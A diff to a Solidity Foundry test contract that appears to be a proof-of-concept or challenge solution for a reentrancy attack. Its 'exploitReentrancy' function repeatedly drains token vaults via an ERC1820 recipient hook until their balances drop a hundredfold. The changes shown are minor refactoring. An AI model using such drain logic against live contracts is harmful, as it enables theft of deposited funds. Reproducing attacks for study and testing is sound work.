@@ -19,12 +19,9 @@ interface ISand is ERC20Like {
 }
 
 contract Solution is Test{
-
-
     bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH =
     0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
     IERC1820Registry constant internal _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
-
 
     address[3] public tokens = [
     0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD, // PNT
@@ -63,8 +60,7 @@ contract Solution is Test{
     function exploitReentrancy(address token) public {
         bool finished = false;
         address vault = hfFactory.underlyingToVault(token);
-        uint vaultBalanceInit = ERC20Like(token).balanceOf(vault);
-        emit log_named_decimal_uint("vault balance", vaultBalanceInit, 18);
+        emit log_named_decimal_uint("vault balance", initialBal[token], 18);
 
         while(!finished) {
             completed[token] = false;
@@ -83,7 +79,7 @@ contract Solution is Test{
             uint vaultBalanceAfter = ERC20Like(token).balanceOf(vault);
             emit log_named_decimal_uint("vault balance after", vaultBalanceAfter, 18);
 
-            if (vaultBalanceInit/vaultBalanceAfter > 100) finished = true;
+            if (initialBal[token]/vaultBalanceAfter > 100) finished = true;
         }
     }
 
